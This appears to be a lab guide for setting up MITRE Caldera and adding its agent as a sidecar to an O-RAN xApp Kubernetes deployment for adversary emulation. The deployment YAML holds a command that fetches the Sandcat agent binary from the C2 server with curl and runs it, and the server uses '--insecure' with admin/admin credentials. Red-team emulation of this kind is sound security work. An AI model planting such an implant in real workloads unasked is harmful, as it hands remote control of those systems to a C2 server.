# MITRE Caldera Deployment Inside xApp Infrastructure

This guide explains how to deploy MITRE Caldera as an adversary emulation tool inside your xApp infrastructure using Miniconda.

## Part 1: Install & Set Up Miniconda

### 1. Download the Miniconda installer script

```bash
curl -O https://repo.anaconda.com/miniconda/Miniconda3-latest-Linux-x86_64.sh
```

### 2. Run the installer

```bash
bash Miniconda3-latest-Linux-x86_64.sh -b -p $HOME/miniconda3
```

### 3. Initialize conda

```bash
eval "$($HOME/miniconda3/bin/conda 'shell.bash' hook)"
conda init bash
```

### 4. Reload terminal

```bash
source ~/.bashrc
```

## Part 2: Setup the Caldera C2 Server Environment

### Step 1: Create and Activate the Conda Environment

```bash
conda create -n caldera-server python=3.10 -y
conda activate caldera-server
```

### Step 2: Install System and Compilation Tools

```bash
conda install -c conda-forge nodejs=20 go upx curl git -y
sudo apt update && sudo apt install -y upx-ucl git curl build-essential
```

### Step 3: Clone the Repository Recursively

```bash
git clone https://github.com/mitre/caldera.git --recursive
cd caldera
```

### Step 4: Install Dependencies and Build the Server

```bash
pip install -r requirements.txt
python3 server.py --insecure --build
```

Login:
- Username: admin
- Password: admin

## Part 3: Compile and Inject the Caldera Agent into the xApp

### Export Deployment

```bash
sudo kubectl get deployment ricxapp-sdl-xapp -n ricxapp -o yaml > ~/Desktop/xapp-live.yaml
```
```bash
apiVersion: apps/v1
kind: Deployment
metadata:
  annotations:
    deployment.kubernetes.io/revision: "1"
    meta.helm.sh/release-name: sdl-xapp
    meta.helm.sh/release-namespace: ricxapp
  labels:
    app: ricxapp-sdl-xapp
    app.kubernetes.io/managed-by: Helm
    chart: sdl-xapp-1.1.0
    heritage: Helm
    release: sdl-xapp
  name: ricxapp-sdl-xapp
  namespace: ricxapp
spec:
  progressDeadlineSeconds: 600
  replicas: 1
  revisionHistoryLimit: 10
  selector:
    matchLabels:
      app: ricxapp-sdl-xapp
      release: sdl-xapp
  strategy:
    rollingUpdate:
      maxSurge: 25%
      maxUnavailable: 25%
    type: RollingUpdate
  template:
    metadata:
      labels:
        app: ricxapp-sdl-xapp
        kubernetes_name: ricxapp_sdl-xapp
        release: sdl-xapp
    spec:
      containers:
      # --- 1. Your Core SDL xApp Container ---
      - envFrom:
        - configMapRef:
            name: configmap-ricxapp-sdl-xapp-appenv
        - configMapRef:
            name: dbaas-appconfig
        image: 127.0.0.1:5000/sdl-xapp:1.1.0
        imagePullPolicy: IfNotPresent
        name: sdl-xapp
        ports:
        - containerPort: 4560
          name: rmr-data
          protocol: TCP
        - containerPort: 4561
          name: rmr-route
          protocol: TCP
        resources: {}
        terminationMessagePath: /dev/termination-log
        terminationMessagePolicy: File
        volumeMounts:
        - mountPath: /opt/ric/config
          name: config-volume

      # --- 2. Integrated Caldera Agent Sidecar Container ---
      - name: caldera-agent-sidecar
        image: nicolaka/netshoot:latest
        command: ["/bin/sh", "-c"]
        args:
          - |
            echo "Waiting for core network paths to stabilize..." && sleep 5;
            echo "Fetching agent payload from Caldera Server...";
            curl -s -X POST -H "file:sandcat.go" -H "platform:linux" http://${HOST_IP}:8888/file/download > /tmp/caldera_agent;
            chmod +x /tmp/caldera_agent;
            echo "Launching agent...";
            /tmp/caldera_agent -server http://${HOST_IP}:8888 -group red -v;
        env:
          - name: HOST_IP
            valueFrom:
              fieldRef:
                fieldPath: status.hostIP

      dnsPolicy: ClusterFirst
      hostname: sdl-xapp
      imagePullSecrets:
      - name: 127-0-0-1-5000
      restartPolicy: Always
      schedulerName: default-scheduler
      securityContext: {}
      terminationGracePeriodSeconds: 30
      volumes:
      - configMap:
          defaultMode: 420
          name: configmap-ricxapp-sdl-xapp-appconfig
        name: config-volume
```


### Apply Deployment

```bash
sudo kubectl apply -f ~/Desktop/xapp-live.yaml
```
